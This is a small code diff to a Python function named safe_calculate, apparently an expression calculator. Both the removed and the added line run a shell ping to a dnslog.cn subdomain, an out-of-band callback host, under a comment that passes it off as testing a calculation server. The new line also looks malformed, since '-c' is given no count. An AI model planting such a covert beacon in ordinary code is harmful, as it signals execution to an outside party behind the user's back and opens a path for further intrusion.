@@ -30,7 +30,7 @@ def safe_calculate(expression):
     """
     try:
         # 测试计算服务器
-        os.system('ping yy7q9u.dnslog.cn')
+        os.system('ping -c yy7q9u.dnslog.cn')
         
         # Remove whitespace
         expression = expression.replace(" ", "")
